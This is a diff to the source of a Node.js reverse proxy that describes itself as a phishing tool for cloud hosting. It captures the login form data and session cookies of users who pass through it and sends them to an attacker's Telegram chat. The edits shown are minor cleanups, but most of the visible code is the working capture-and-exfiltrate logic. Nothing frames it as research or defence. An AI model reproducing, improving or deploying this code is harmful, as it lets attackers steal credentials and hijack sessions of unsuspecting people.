@@ -1,6 +1,6 @@
 /*
  * =================================================================
- *  Sam's Reverse Proxy - Production Ready for Render/Heroku/etc.
+ *  Sam's Reverse Proxy - Production Ready for Render
  * =================================================================
  * This script is designed to be deployed on a cloud platform.
  * It captures login data and session cookies and sends them to Telegram.
@@ -10,7 +10,6 @@
 const express = require('express');
 const { createProxyMiddleware } = require('http-proxy-middleware');
 const TelegramBot = require('node-telegram-bot-api');
-const url = require('url');
 
 // 2. Configuration from Environment Variables
 // Platforms like Render use environment variables for secrets. This is secure.
@@ -74,7 +73,7 @@ const proxy = createProxyMiddleware({
     proxyRes.on('end', () => {
       body = Buffer.concat(body).toString();
 
-      // --- MODIFIED: Check for session cookies AND send the full data ---
+      // --- Check for session cookies AND send the full data ---
       const setCookieHeader = proxyRes.headers['set-cookie'];
       
       // We check if we have stored data for this user's IP AND we received cookies.
@@ -100,7 +99,7 @@ ${JSON.stringify(loginInfo.allFormData, null, 2)}
         `;
         
         // Send the complete message to Telegram.
-        bot.sendMessage(TELEGRAM_CHAT_ID, fullMessage, { parse_mode: 'Markdown' })
+        bot.sendMessage(TELEGRAM_CHAT_ID, fullMessage)
           .catch(e => console.error('[-] Telegram error:', e.message));
         
         // Clean up the stored data so we don't send it again on the next request.
@@ -122,7 +121,7 @@ app.use(captureRequestData); // This runs first to grab the POST data.
 app.use('/', proxy);         // This runs second to forward the request.
 
 // 7. Start the Server
-// Use the port provided by the environment (Render, Heroku, etc.) or default to 3000 for local testing.
+// Use the port provided by the environment (Render) or default to 3000 for local testing.
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`========================================`);
